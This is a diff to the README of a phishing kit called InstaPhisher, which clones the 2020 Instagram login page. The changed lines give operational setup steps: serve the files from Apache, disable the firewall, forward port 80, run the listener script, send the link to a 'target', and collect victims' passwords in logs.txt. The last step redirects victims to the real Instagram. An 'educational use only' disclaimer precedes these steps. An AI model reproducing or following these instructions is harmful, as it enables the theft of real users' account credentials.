@@ -13,7 +13,7 @@ I am in no way responsible for illegal uses. For educational use only.
 
 This site is a clone of the 2020 instagram login page. You need to have and configure a DNS (you can get a free one here: https://www.freenom.com/fr). You must also have a valid apache version (https://httpd.apache.org/download.cgi), mysql (https://www.mysql.com/) and php (https://www.php.net/downloads).
 
-Then, move all InstaPhisher files to the apache folder ('/var/www/html' for linux). Make sure to disable your firewall and redirect the port 80 (UDP/TCP) on your router to your machine. Then, grant read and write permissions to the files listner.py and login.php. After, use python in a terminal and start the file listner.py. Send your link to your target and wait. Please do not modify the logs.txt file during this step. When your victim logs on, you'll be notified via terminal. The passwords will be saved in the logs.txt file.
+Then, move all InstaPhisher files to the apache folder ("/var/www/html" for linux). Make sure to disable your firewall and redirect the port 80 (UDP/TCP) on your router to your machine. Then, grant read and write permissions to the files InstaPhisher.py and login.php. After, use python in a terminal and start the file InstaPhisher.py. Send your DNS url to your target and wait. Please do not modify the logs.txt file during this step. When your victim logs on, you'll be notified via terminal. The passwords will be saved in the logs.txt file.
 
 You can modify the redirect link in the login.php file. Enter url in header() function, after 'Location: ' at line 19. The default redirection is https://www.instagram.com.
 
